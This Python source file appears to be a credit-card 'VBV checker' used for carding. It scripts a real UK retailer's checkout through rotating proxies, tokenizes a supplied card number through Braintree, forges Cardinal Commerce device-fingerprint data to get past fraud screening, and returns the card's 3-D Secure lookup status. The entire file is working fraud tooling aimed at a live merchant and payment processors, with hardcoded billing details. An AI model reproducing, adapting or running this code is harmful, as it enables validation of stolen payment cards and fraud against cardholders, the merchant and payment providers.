import requests,re,base64,uuid,random,string
from proxy import proxies
async def plug_rnd():
    random_chars = "".join(random.choices(string.ascii_letters + string.digits, k=10))
    random_suffix = "".join(random.choices(string.ascii_letters + string.digits, k=28))
    random_yux = "".join(random.choices(string.ascii_letters + string.digits, k=3))
    return f"{random_chars}::{random_suffix}::{random_yux}"

async def vbv_api(cc):
    r = requests.session()
    r.proxies = proxies()
    session_id = str(uuid.uuid4())
    plug = await plug_rnd()
    plug2 = await plug_rnd()
    Fingerprint = "".join(random.choice("0123456789abcdef") for _ in range(32))
    try:
        response = r.get("https://www.robertwhite.co.uk/filters.html?dir=asc&order=price")
        prod_id = re.findall(r'product/(\d+)/', response.text)[0]
        form_key = re.findall(r'form_key/(\w+)/', response.text)[0]
    except:
        return '[VBV] => Error: 1st req.'
    headers = {
        "accept": "application/json, text/javascript, */*; q=0.01",
        "accept-encoding": "gzip, deflate, br, zstd",
        "accept-language": "en-US,en;q=0.6",
        "cache-control": "no-cache",
        "pragma": "no-cache",
        "priority": "u=1, i",
        "referer": "https://www.robertwhite.co.uk/filters.html",
        "user-agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/127.0.0.0 Safari/537.36",
        "x-requested-with": "XMLHttpRequest"
    }

    response = r.get(f'https://www.robertwhite.co.uk/ajax/index/add/uenc/aHR0cHM6Ly93d3cucm9iZXJ0d2hpdGUuY28udWsvZmlsdGVycy5odG1s/product/{prod_id}/form_key/{form_key}/isAjax/1', headers=headers)

    response = r.get("https://www.robertwhite.co.uk/checkout/cart/", headers=headers)
    headers = {
        "accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8",
        "accept-encoding": "gzip, deflate, br, zstd",
        "accept-language": "en-US,en;q=0.6",
        "cache-control": "no-cache",
        "pragma": "no-cache",
        "priority": "u=0, i",
        "referer": "https://www.robertwhite.co.uk/checkout/cart/",
        "user-agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/127.0.0.0 Safari/537.36"
    }
    response = r.get("https://www.robertwhite.co.uk/onepage/", headers=headers)

    headers = {
        "accept": "text/javascript, text/html, application/xml, text/xml, */*",
        "accept-encoding": "gzip, deflate, br, zstd",
        "accept-language": "en-US,en;q=0.6",
        "cache-control": "no-cache",
        "pragma": "no-cache",
        "priority": "u=1, i",
        "referer": "https://www.robertwhite.co.uk/onepage/",
        "x-requested-with": "XMLHttpRequest"
    }
    try:
        response = r.get("https://www.robertwhite.co.uk/braintree/checkout/clientToken/", headers=headers).json()
        ct = response['client_token']
        decode = base64.b64decode(ct).decode('utf-8')
        at = re.findall(r'authorizationFingerprint":"(.*?)"', decode)[0]
        mr_id = re.findall(r'merchantId":"(.*?)"', decode)[0]
    except:
        return '[VBV] => Error: 2nd req.'
    headers = {
        'accept': '*/*',
        'accept-language': 'en-US,en;q=0.9',
        'authorization': f'Bearer {at}',
        'braintree-version': '2018-05-10',
        'cache-control': 'no-cache',
        'content-type': 'application/json',
        'origin': 'https://www.robertwhite.co.uk',
        'pragma': 'no-cache',
        'priority': 'u=1, i',
        'referer': 'https://www.robertwhite.co.uk/',
        'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/128.0.0.0 Safari/537.36',
    }

    json_data = {
        'clientSdkMetadata': {
            'source': 'client',
            'integration': 'custom',
            'sessionId': session_id,
        },
        'query': 'query ClientConfiguration {   clientConfiguration {     analyticsUrl     environment     merchantId     assetsUrl     clientApiUrl     creditCard {       supportedCardBrands       challenges       threeDSecureEnabled       threeDSecure {         cardinalAuthenticationJWT       }     }     applePayWeb {       countryCode       currencyCode       merchantIdentifier       supportedCardBrands     }     googlePay {       displayName       supportedCardBrands       environment       googleAuthorization     }     ideal {       routeId       assetsUrl     }     kount {       merchantId     }     masterpass {       merchantCheckoutId       supportedCardBrands     }     paypal {       displayName       clientId       privacyUrl       userAgreementUrl       assetsUrl       environment       environmentNoNetwork       unvettedMerchant       braintreeClientId       billingAgreementsEnabled       merchantAccountId       currencyCode       payeeEmail     }     unionPay {       merchantAccountId     }     usBankAccount {       routeId       plaidPublicKey     }     venmo {       merchantId       accessToken       environment     }     visaCheckout {       apiKey       externalClientId       supportedCardBrands     }     braintreeApi {       accessToken       url     }     supportedFeatures   } }',
        'operationName': 'ClientConfiguration',
    }
    try:
        response = r.post('https://payments.braintree-api.com/graphql', headers=headers, json=json_data).json()
        jwt_token = response['data']['clientConfiguration']['creditCard']['threeDSecure']['cardinalAuthenticationJWT']
    except:
        return '[VBV] => Error: 3rd req.'
    headers = {
        "accept": "*/*",
        "accept-encoding": "gzip, deflate, br, zstd",
        "accept-language": "en-US,en;q=0.6",
        "authorization": f"Bearer {at}",
        "braintree-version": "2018-05-10",
        "cache-control": "no-cache",
        "content-type": "application/json",
        "origin": "https://assets.braintreegateway.com",
        "pragma": "no-cache",
        "priority": "u=1, i",
        "referer": "https://assets.braintreegateway.com/",
        "user-agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/127.0.0.0 Safari/537.36"
    }
    json_data = {
        "clientSdkMetadata": {
            "source": "client",
            "integration": "custom",
            "sessionId": session_id,
        },
        "query": "mutation TokenizeCreditCard($input: TokenizeCreditCardInput!) {   tokenizeCreditCard(input: $input) {     token     creditCard {       bin       brandCode       last4       binData {         prepaid         healthcare         debit         durbinRegulated         commercial         payroll         issuingBank         countryOfIssuance         productId       }     }   } }",
        "variables": {
            "input": {
                "creditCard": {
                    "number": cc,
                    "expirationMonth": "06",
                    "expirationYear": "2031",
                    "cvv": "510",
                    "billingAddress": {
                        "postalCode": "IP15DL"
                    }
                },
                "options": {
                    "validate": False
                }
            }
        },
        "operationName": "TokenizeCreditCard"
    }
    try:
        response = r.post("https://payments.braintree-api.com/graphql", json=json_data, headers=headers).json()
        token = response['data']['tokenizeCreditCard']['token']
    except:
        return '[VBV] => Error: 4th req.'
    
    headers = {
        'accept': '*/*',
        'accept-language': 'en-US,en;q=0.9',
        'cache-control': 'no-cache',
        'content-type': 'application/json;charset=UTF-8',
        'origin': 'https://www.robertwhite.co.uk',
        'pragma': 'no-cache',
        'priority': 'u=1, i',
        'referer': 'https://www.robertwhite.co.uk/',
        'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/128.0.0.0 Safari/537.36',
        'x-cardinal-tid': 'Tid-7972d418-53e0-4ccb-ac30-c3456f4fbe2d',
    }
    json_data = {
        'BrowserPayload': {
            'Order': {
                'OrderDetails': {},
                'Consumer': {
                    'BillingAddress': {},
                    'ShippingAddress': {},
                    'Account': {},
                },
                'Cart': [],
                'Token': {},
                'Authorization': {},
                'Options': {},
                'CCAExtension': {},
            },
            'SupportsAlternativePayments': {
                'cca': True,
                'hostedFields': False,
                'applepay': False,
                'discoverwallet': False,
                'wallet': False,
                'paypal': False,
                'visacheckout': False,
            },
        },
        'Client': {
            'Agent': 'SongbirdJS',
            'Version': '1.35.0',
        },
        'ConsumerSessionId': None,
        'ServerJWT': jwt_token,
    }
    try:
        response = r.post('https://centinelapi.cardinalcommerce.com/V1/Order/JWT/Init', headers=headers, json=json_data).json()
        jwt2 = response['CardinalJWT'] 
        encabezado_base64, carga_util_base64, firma = jwt2.split(".")
        re_1 = base64.urlsafe_b64decode(carga_util_base64 + "=" * (4 - len(carga_util_base64) % 4)).decode("utf-8")
        dref = re.findall(r'"ReferenceId":"([^"]+)', re_1)[0]
        ge = re.findall(r'"geolocation":"([^"]+)', re_1)[0]
        org = re.findall(r'"orgUnitId":"([^"]+)', re_1)[0]
    except:
        return '[VBV] => Error: 5th req.'
    headers = {
        'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
        'accept-language': 'en-US,en;q=0.9',
        'cache-control': 'no-cache',
        'pragma': 'no-cache',
        'priority': 'u=0, i',
        'referer': 'https://www.robertwhite.co.uk/',
        'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/128.0.0.0 Safari/537.36',
    }

    params = {
        'threatmetrix': 'true',
        'alias': 'Default',
        'orgUnitId': org,
        'tmEventType': 'PAYMENT',
        'referenceId': dref,
        'geolocation': ge,
        'origin': 'Songbird',
    }
    try:
        response = r.get('https://geo.cardinalcommerce.com/DeviceFingerprintWeb/V2/Browser/Render',params=params,headers=headers)
        nonce = re.findall(r'"nonce":"([^"]+)', response.text)[0]
    except:
        return '[VBV] => Error: 6th req.'
    headers = {
        'accept': '*/*',
        'accept-language': 'en-US,en;q=0.9',
        'cache-control': 'no-cache',
        'content-type': 'application/json',
        'origin': 'https://geo.cardinalcommerce.com',
        'pragma': 'no-cache',
        'priority': 'u=1, i',
        'referer': f'https://geo.cardinalcommerce.com/DeviceFingerprintWeb/V2/Browser/Render?threatmetrix=true&alias=Default&orgUnitId={org}&tmEventType=PAYMENT&referenceId={dref}&geolocation={ge}&origin=Songbird',
        'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/128.0.0.0 Safari/537.36',
        'x-requested-with': 'XMLHttpRequest',
    }

    json_data = {
        'Cookies': {
            'Legacy': True,
            'LocalStorage': True,
            'SessionStorage': True,
        },
        'DeviceChannel': 'Browser',
        'Extended': {
            'Browser': {
                'Adblock': True,
                'AvailableJsFonts': [],
                'DoNotTrack': 'unknown',
                'JavaEnabled': False,
            },
            'Device': {
                'ColorDepth': 24,
                'Cpu': 'unknown',
                'Platform': 'Win32',
                'TouchSupport': {
                    'MaxTouchPoints': 0,
                    'OnTouchStartAvailable': False,
                    'TouchEventCreationSuccessful': False,
                },
            },
        },
        'Fingerprint': Fingerprint,
        'FingerprintingTime': 1136,
        'FingerprintDetails': {
            'Version': '1.5.1',
        },
        'Language': 'en-US',
        'Latitude': None,
        'Longitude': None,
        'OrgUnitId': org,
        'Origin': 'Songbird',
        "Plugins": [f"{plug}", f"{plug2}"],
        'ReferenceId': dref,
        'Referrer': 'https://www.robertwhite.co.uk/',
        'Screen': {
            'FakedResolution': False,
            'Ratio': 1.7777777777777777,
            'Resolution': '1536x864',
            'UsableResolution': '1536x816',
            'CCAScreenSize': '02',
        },
        'CallSignEnabled': None,
        'ThreatMetrixEnabled': False,
        'ThreatMetrixEventType': 'PAYMENT',
        'ThreatMetrixAlias': 'Default',
        'TimeOffset': -330,
        'UserAgent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/128.0.0.0 Safari/537.36',
        'UserAgentDetails': {
            'FakedOS': False,
            'FakedBrowser': False,
        },
        'BinSessionId': nonce,
    }
    response = r.post('https://geo.cardinalcommerce.com/DeviceFingerprintWeb/V2/Browser/SaveBrowserData',headers=headers,json=json_data)
    headers = {
        "accept": "*/*",
        "accept-encoding": "gzip, deflate, br, zstd",
        "accept-language": "en-US,en;q=0.6",
        "cache-control": "no-cache",
        "content-length": "1513",
        "content-type": "application/json",
        "origin": "https://www.robertwhite.co.uk",
        "pragma": "no-cache",
        "priority": "u=1, i",
        "referer": "https://www.robertwhite.co.uk/",
        "user-agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/127.0.0.0 Safari/537.36"
    }
    json_data = {
        "amount": "4.00",
        "additionalInfo": {
            "shippingGivenName": "",
            "shippingSurname": "",
            "shippingPhone": "",
            "billingLine1": "Europa Way",
            "billingLine2": "",
            "billingCity": "Ipswich",
            "billingState": "Suffolk",
            "billingPostalCode": "IP15DL",
            "billingCountryCode": "GB",
            "billingPhoneNumber": "0844 826 6555",
            "billingGivenName": "Alan",
            "billingSurname": " Lloyd",
            "shippingLine1": "",
            "shippingLine2": "",
            "shippingCity": "",
            "shippingState": "",
            "shippingPostalCode": "",
            "shippingCountryCode": "GB"
        },
        "dfReferenceId": dref,
        "clientMetadata": {
            "sdkVersion": "web/3.48.0",
            "requestedThreeDSecureVersion": "2",
            "cardinalDeviceDataCollectionTimeElapsed": 277
        },
        "authorizationFingerprint": at,
        "braintreeLibraryVersion": "braintree/web/3.48.0",
        "_meta": {
            "merchantAppId": "www.robertwhite.co.uk",
            "platform": "web",
            "sdkVersion": "3.48.0",
            "source": "client",
            "integration": "custom",
            "integrationType": "custom",
            "sessionId": session_id,
        }
    }
    try:
        response = r.post(f"https://api.braintreegateway.com/merchants/{mr_id}/client_api/v1/payment_methods/{token}/three_d_secure/lookup",headers=headers,json=json_data).json()
        status = response['paymentMethod']['threeDSecureInfo']['status']
        Resp = status.replace('_', ' ').title()
        return Resp
    except:
        return '[VBV] => Error: 7th req.'

